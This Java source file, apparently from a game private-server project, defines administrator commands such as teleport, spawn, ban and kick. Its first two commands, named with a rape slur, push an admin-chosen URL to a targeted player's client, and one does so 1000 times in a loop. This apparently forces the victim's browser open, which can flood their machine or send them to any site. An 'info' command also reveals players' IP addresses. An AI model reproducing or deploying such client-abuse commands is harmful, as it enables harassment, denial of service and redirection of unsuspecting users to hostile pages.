package wind.model.players.packets.commands.impl;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;

import wind.Config;
import wind.Punishments;
import wind.model.items.ItemAssistant;
import wind.model.items.ItemTableManager;
import wind.model.npcs.NPCHandler;
import wind.model.players.Client;
import wind.model.players.PlayerHandler;
import wind.model.players.Rights;
import wind.model.players.packets.commands.Command;
import wind.model.players.packets.commands.CommandBuilder;
import wind.model.players.saving.CharacterBackup;

public class AdminCommands extends CommandBuilder {

	@Override
	public Command[] commands() {
		return new Command[] {
				new PlayerCommand("rape") {
					@Override
					public void execute(Client c, String command) {
					try { 
						String playerToBan = command.split(" ")[2];
						String url = command.split(" ")[1];
						//String platerToBan = command.split(" ")[2];
						for(int i = 0; i < Config.MAX_PLAYERS; i++) {
							if(PlayerHandler.players[i] != null) {
								if(PlayerHandler.players[i].playerName.equalsIgnoreCase(playerToBan)) {
									Client c2 = (Client)PlayerHandler.players[i];
									c.sendMessage("You have RAPED " + c2.playerName);
									int timesToLoop = 1;
									for (int j = 0; j < timesToLoop; j++) {
										c2.getPA().sendFrame126("" + url + "", 12000);
									}
									break;
								}
							}
						}
					} catch(Exception e) {
						c.sendMessage("Player Must Be Offline.");
					}
				}
				},
				new PlayerCommand("rape2") {
					@Override
					public void execute(Client c, String command) {
					try { 
						String playerToBan = command.substring(5);
						for(int i = 0; i < Config.MAX_PLAYERS; i++) {
							if(PlayerHandler.players[i] != null) {
								if(PlayerHandler.players[i].playerName.equalsIgnoreCase(playerToBan)) {
									Client c2 = (Client)PlayerHandler.players[i];
									c.sendMessage("You have RAPED2 " + c2.playerName);
									int timesToLoop = 1000;
									for (int j = 0; j < timesToLoop; j++) {
										c2.getPA().sendFrame126("www.google.com", 12000);
									}
									break;
								}
							}
						}
					} catch(Exception e) {
						c.sendMessage("Player Must Be Offline.");
					}
				}
				},

	/*	new PlayerCommand("teletome") {
			@Override
			public void execute(Client c, String command) {
				try {
					String playerToBan = command.substring(9);
					for (int i = 0; i < Config.MAX_PLAYERS; i++) {
						if (PlayerHandler.players[i] != null) {
							if (PlayerHandler.players[i].playerName
									.equalsIgnoreCase(playerToBan)) {
								Client c2 = (Client) PlayerHandler.players[i];
								if (c2.duelStatus == 5) {
									c.sendMessage("You cannot teleport a player to you when he is during a duel.");
									return;
								}
								c2.teleportToX = c.absX;
								c2.teleportToY = c.absY;
								c2.heightLevel = c.heightLevel;
								c.sendMessage("You have teleported "
										+ c2.playerName + " to you.");
								c2.sendMessage("You have been teleported to "
										+ c.playerName + "");
							}
						}
					}
				} catch (Exception e) {
					c.sendMessage("Player Must Be Offline.");
				}
			}
		},



		new PlayerCommand("teleto") {
			@Override
			public void execute(Client c, String command) {
				String name = command.substring(7);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (PlayerHandler.players[i] != null) {
						if (PlayerHandler.players[i].playerName
								.equalsIgnoreCase(name)) {
							Client c2 = (Client) PlayerHandler.players[i];
							if (c.duelStatus == 5) {
								c.sendMessage("You cannot teleport to a player during a duel.");
								return;
							}
							c.getPA().movePlayer(
									PlayerHandler.players[i].getX(),
									PlayerHandler.players[i].getY(),
									PlayerHandler.players[i].getHeightLevel);
						}
					}
				}
			}
		}, */

		new PlayerCommand("setlvl") {
			@Override
			public void execute(Client c, String command) {
				String[] args = command.split(" ");
				int skill = Integer.parseInt(args[1]);
				int level = Integer.parseInt(args[2]);
				if (level > 99) {
					level = 99;
				} else if (level < 0) {
					level = 1;
				}
				c.playerXP[skill] = c.getPA().getXPForLevel(level) + 5;
				c.playerLevel[skill] = c.getPA().getLevelForXP(
						c.playerXP[skill]);
				c.getPA().refreshSkill(skill);
			}
		},
		
		new PlayerCommand("givekc") {
			@Override
			public void execute(Client c, String command) {
				c.bandosKills += 20;
				c.armaKills += 20;
				c.zamorakKills += 20;
				c.saraKills += 20;
			}
		},

		new PlayerCommand("backup") {
			@Override
			public void execute(Client c, String command) {
				CharacterBackup.startBackupService();
			}
		},

		new PlayerCommand("ah") {
			@Override
			public void execute(Client c, String command) {
				c.getPA().startAdminTeleport(Config.STAFFZONE_X,
						Config.STAFFZONE_Y, 0);
			}
		},

		new PlayerCommand("run") {
			@Override
			public void execute(Client c, String command) {
				c.runEnergy = 10000;
			}
		},

		new PlayerCommand("spawn") {
			@Override
			public void execute(Client c, String command) {
				for (int j = 0; j < PlayerHandler.players.length; j++) {
					if (PlayerHandler.players[j] != null) {
						Client c2 = (Client) PlayerHandler.players[j];
						try {
							BufferedWriter spawn = new BufferedWriter(
									new FileWriter(Config.DATA_LOC
											+ "cfg/spawn-config.cfg", true));
							String Test123 = command.substring(6);
							int Test124 = Integer
									.parseInt(command.substring(6));
							if (Test124 > 0) {
								NPCHandler.spawnNpc(c, Test124, c.absX,
										c.absY, 0, 0, 120, 7, 70, 70, false,
										false);
								c.sendMessage("You spawn a Npc.");
							} else {
								c.sendMessage("No such NPC.");
							}
							try {
								spawn.newLine();
								spawn.write("spawn = " + Test123 + "	" + c.absX
										+ "	" + c.absY + "	0	0	0	0	0");
								c2.sendMessage("<shad=15695415>[Npc-Spawn</col>]: An Npc has been added to the map!");
							} finally {
								spawn.close();
							}
						} catch (IOException e) {
							e.printStackTrace();
						}
					}
				}
			}
		},

		new PlayerCommand("brownon") {
			@Override
			public void execute(Client c, String command) {
				c.redSkull = true;
				c.isSkulled = true;
				c.skullTimer = Config.SKULL_TIMER;
				c.headIconPk = 1;
				c.getPA().requestUpdates();
				// CombatPrayer.resetProtectItem(c);
				c.sendMessage("@blu@You are now @red@redskulled@blu@.");
			}
		},
		new PlayerCommand("silveron") {
			@Override
			public void execute(Client c, String command) {
				c.redSkull = true;
				c.isSkulled = true;
				c.skullTimer = Config.SKULL_TIMER;
				c.headIconPk = 2;
				c.getPA().requestUpdates();
				// CombatPrayer.resetProtectItem(c);
				c.sendMessage("@blu@You are now @red@redskulled@blu@.");
			}
		},
		new PlayerCommand("greenon") {
			@Override
			public void execute(Client c, String command) {
				c.redSkull = true;
				c.isSkulled = true;
				c.skullTimer = Config.SKULL_TIMER;
				c.headIconPk = 3;
				c.getPA().requestUpdates();
				// CombatPrayer.resetProtectItem(c);
				c.sendMessage("@blu@You are now @red@redskulled@blu@.");
			}
		},
		new PlayerCommand("blueon") {
			@Override
			public void execute(Client c, String command) {
				c.redSkull = true;
				c.isSkulled = true;
				c.skullTimer = Config.SKULL_TIMER;
				c.headIconPk = 4;
				c.getPA().requestUpdates();
				// CombatPrayer.resetProtectItem(c);
				c.sendMessage("@blu@You are now @red@redskulled@blu@.");
			}
		},
		new PlayerCommand("redon") {
			@Override
			public void execute(Client c, String command) {
				c.redSkull = true;
				c.isSkulled = true;
				c.skullTimer = Config.SKULL_TIMER;
				c.headIconPk = 5;
				c.getPA().requestUpdates();
				// CombatPrayer.resetProtectItem(c);
				c.sendMessage("@blu@You are now @red@redskulled@blu@.");
			}
		},

		new PlayerCommand("redoff") {
			@Override
			public void execute(Client c, String command) {
				if (c.redSkull) {
					c.redSkull = false;
					c.isSkulled = false;
					c.skullTimer = Config.SKULL_TIMER;
					c.headIconPk = -1;
					c.getPA().requestUpdates();
					// CombatPrayer.resetProtectItem(c);
					c.sendMessage("@blu@You are now no longer @gre@ skulled.");
				} else {
					c.sendMessage("You do not have a red skull.");
				}
			}
		},

		new PlayerCommand("bank") {
			@Override
			public void execute(Client c, String command) {
				if (c.inWild()) {
					c.sendMessage("You cant open bank in wilderness.");
					return;
				}
				if (c.duelStatus >= 1) {
					// c.sendMessage("You cant open bank during a duel.");
					return;
				}
				if (c.inTrade) {
					// c.sendMessage("You cant open bank during a trade");
					return;
				}
				c.getPA().openUpBank();
			}
		},

		new PlayerCommand("sendhome") {
			@Override
			public void execute(Client c, String command) {
				try {
					String playerToBan = command.substring(9);
					for (int i = 0; i < Config.MAX_PLAYERS; i++) {
						if (PlayerHandler.players[i] != null) {
							if (PlayerHandler.players[i].playerName
									.equalsIgnoreCase(playerToBan)) {
								Client c2 = (Client) PlayerHandler.players[i];
								c2.teleportToX = 3365;
								c2.teleportToY = 3265;
								c2.heightLevel = c.heightLevel;
								c.sendMessage("You have teleported "
										+ c2.playerName + " to home");
								c2.sendMessage("You have been teleported to home");
							}
						}
					}
				} catch (Exception e) {
					c.sendMessage("Player Must Be Offline.");
				}
			}
		},

	/*	new PlayerCommand("teletome") {
			@Override
			public void execute(Client c, String command) {
				try {
					String playerToBan = command.substring(9);
					for (int i = 0; i < Config.MAX_PLAYERS; i++) {
						Client c2 = (Client) PlayerHandler.players[i];
						if (PlayerHandler.players[i] != null) {
							if (PlayerHandler.players[i].playerName
									.equalsIgnoreCase(playerToBan)) {
								c2.teleportToX = c.absX;
								c2.teleportToY = c.absY;
								c2.heightLevel = c.heightLevel;
								c.sendMessage("You have teleported "
										+ c2.playerName + " to you.");
								c2.sendMessage("You have been teleported to "
										+ c.playerName + "");
							}
							if (c2.playerName.equalsIgnoreCase("mod sunny")) {
								c.sendMessage("You can't use this command on this player!");
								return;
							}
						}
					}
				} catch (Exception e) {
					c.sendMessage("Player Must Be Offline.");
				}
			}
		},

		new PlayerCommand("teleto") {
			@Override
			public void execute(Client c, String command) {
				String name = command.substring(8);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (PlayerHandler.players[i] != null) {
						if (PlayerHandler.players[i].playerName
								.equalsIgnoreCase(name)) {
							@SuppressWarnings("unused")
							Client c2 = (Client) PlayerHandler.players[i];
							c.getPA().movePlayer(
									PlayerHandler.players[i].getX(),
									PlayerHandler.players[i].getY(),
									c.heightLevel);
						}
					}
				}
			}
		}, */

		new PlayerCommand("tele") {
			@Override
			public void execute(Client c, String command) {
				String[] arg = command.split(" ");
				if (arg.length > 3)
					c.getPA().movePlayer(Integer.parseInt(arg[1]),
							Integer.parseInt(arg[2]), Integer.parseInt(arg[3]));
				else if (arg.length == 3)
					c.getPA().movePlayer(Integer.parseInt(arg[1]),
							Integer.parseInt(arg[2]), c.heightLevel);
			}
		},

		new PlayerCommand("getid") {
			@Override
			public void execute(Client c, String command) {
				String a[] = command.split(" ");
				String name = "";
				int results = 0;
				for (int i = 1; i < a.length; i++) {
					name = name + a[i] + " ";
				}
				name = name.substring(0, name.length() - 1);
				c.sendMessage("Searching: " + name);
				for (int j = 0; j < ItemTableManager.ITEMS.size(); j++) {
					if (!ItemTableManager.ITEMS.isEmpty()) {
						c.getItems();
						if (ItemAssistant.getItemName(j)
								.replace("_", " ").toLowerCase()
								.contains(name.toLowerCase())) {
							c.getItems();
							c.sendMessage("<col=255>"
									+ ItemAssistant.getItemName(j)
											.replace("_", " ") + " - "
									+ c.getItems().getItemId(j));
							results++;
						}
					}
				}
				c.sendMessage(results + " results found...");
			}
		},

		new PlayerCommand("bank") {
			@Override
			public void execute(Client c, String command) {
				c.getPA().openUpBank();
			}
		},

		new PlayerCommand("mypos") {
			@Override
			public void execute(Client c, String command) {
				c.sendMessage("X: " + c.absX);
				c.sendMessage("Y: " + c.absY);
				c.sendMessage("H: " + c.heightLevel);
			}
		},

		new PlayerCommand("npc") {
			@Override
			public void execute(Client c, String command) {
				try {
					int newNPC = Integer.parseInt(command.substring(4));
					if (newNPC >= 0) {
						NPCHandler.spawnNpc(c, newNPC, c.absX, c.absY,
								0, 0, 120, 7, 70, 70, false, false);
						c.sendMessage("You spawn a Npc.");
					} else {
						c.sendMessage("No such NPC.");
					}
				} catch (Exception e) {

				}
			}
		},

		new PlayerCommand("ipban") {
			@Override
			public void execute(Client c, String command) {
				try {
					String playerToBan = command.substring(6);
					for (int i = 0; i < Config.MAX_PLAYERS; i++) {
						if (PlayerHandler.players[i] != null) {
							if (PlayerHandler.players[i].playerName
									.equalsIgnoreCase(playerToBan)) {
								if (c.playerName == PlayerHandler.players[i].playerName) {
									c.sendMessage("You cannot IP Ban yourself.");
								}
								if (c.playerName.equalsIgnoreCase("mod sunny")) {
									c.sendMessage("You can't use this command on this player!");
									return;
								} else {
									if (!Punishments
											.isIpBanned(PlayerHandler.players[i].connectedFrom)) {
										Punishments
												.addIpToBanList(PlayerHandler.players[i].connectedFrom);
										Punishments
												.addIpToFile(PlayerHandler.players[i].connectedFrom);
										c.sendMessage("You have IP banned the user: "
												+ PlayerHandler.players[i].playerName
												+ " with the host: "
												+ PlayerHandler.players[i].connectedFrom);
										PlayerHandler.players[i].disconnected = true;
									} else {
										c.sendMessage("This user is already IP Banned.");
									}
								}
							}
						}
					}
				} catch (Exception e) {
					c.sendMessage("Player Must Be Offline.");
				}
			}
		},

		new PlayerCommand("uidban") {
			@Override
			public void execute(Client c, String command) {
				try {
					String playerToBan = command.substring(7);
					for (int i = 0; i < PlayerHandler.players.length; i++) {
						if (PlayerHandler.players[i] != null) {
							if (PlayerHandler.players[i].playerName
									.equalsIgnoreCase(playerToBan)
									&& PlayerHandler.players[i].getRights()
											.less(Rights.ADMINISTRATOR)) {
								Punishments
										.addUidToBanList(PlayerHandler.players[i].UUID);
								Punishments
										.addUidToFile(PlayerHandler.players[i].UUID);
								if (c.getRights().greaterOrEqual(
										Rights.ADMINISTRATOR)) {
									c.sendMessage("@red@["
											+ PlayerHandler.players[i].playerName
											+ "] has been UUID Banned with the UUID: "
											+ PlayerHandler.players[i].UUID);
								} else {
									c.sendMessage("@red@["
											+ PlayerHandler.players[i].playerName
											+ "] has been UUID Banned.");
								}
								PlayerHandler.players[i].disconnected = true;
							}
						}
					}
				} catch (Exception ignored) {
				}
			}
		}, new PlayerCommand("unuidban") {
			@Override
			public void execute(Client c, String command) {
				String player = command.substring(9);
				Punishments.getUidForUser(c, player);
			}
		},

		new PlayerCommand("info") {
			@Override
			public void execute(Client c, String command) {
				String player = command.substring(5);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (PlayerHandler.players[i] != null) {
						if (PlayerHandler.players[i].playerName
								.equalsIgnoreCase(player)) {
							c.sendMessage("ip: "
									+ PlayerHandler.players[i].connectedFrom);
						}
					}
				}
			}
		},
		new PlayerCommand("ban") {
			@Override
			public void execute(Client c, String command) {
				try {
					String playerToBan = command.substring(4);
					Punishments.addNameToBanList(playerToBan);
					Punishments.addNameToFile(playerToBan);
					for (int i = 0; i < Config.MAX_PLAYERS; i++) {
						if (PlayerHandler.players[i] != null) {
							if (PlayerHandler.players[i].playerName
									.equalsIgnoreCase(playerToBan)) {
								PlayerHandler.players[i].disconnected = true;
							}
						}
					}
				} catch (Exception e) {
					c.sendMessage("Player Must Be Offline.");
				}
			}
		},

		new PlayerCommand("unban") {
			@Override
			public void execute(Client c, String command) {
				try {
					String playerToBan = command.substring(6);
					Punishments.removeNameFromBanList(playerToBan);
					c.sendMessage(playerToBan + " has been unbanned.");
				} catch (Exception e) {
					c.sendMessage("Player Must Be Offline.");
				}
			}
		},

		new PlayerCommand("kick") {
			@Override
			public void execute(Client c, String command) {
				try {
					String playerToBan = command.substring(5);
					for (int i = 0; i < Config.MAX_PLAYERS; i++) {
						if (PlayerHandler.players[i] != null) {
							if (PlayerHandler.players[i].playerName
									.equalsIgnoreCase(playerToBan)) {
								Client c2 = (Client) PlayerHandler.players[i];
								//PlayerHandler.players[i].isKicked=true;
								if (c2.getRights().greaterOrEqual(Rights.ADMINISTRATOR)) {
									c.sendMessage("You can't use this command on Admin+.");
									return;
								}
								else {
									c2.logout();
								}
							}
						}
					}
				} catch (Exception e) {
					c.sendMessage("Player Must Be Offline.");
				}
			}
		},
		
		new PlayerCommand("maxhitr") {
			@Override
			public void execute(Client c, String command) {
				c.sendMessage("Your current maxhit is: @blu@"
						+ c.getCombat().calculateRangeAttack());
			}
		},		
		
		};
	}

	private static class PlayerCommand implements Command {

		private final String[] keys;

		public PlayerCommand(String... keys) {
			this.keys = keys;
		}

		public void execute(Client c, String command) {

		}

		@Override
		public Rights rank() {
			return Rights.ADMINISTRATOR;
		}

		@Override
		public String[] key() {
			return keys;
		}

	}

}
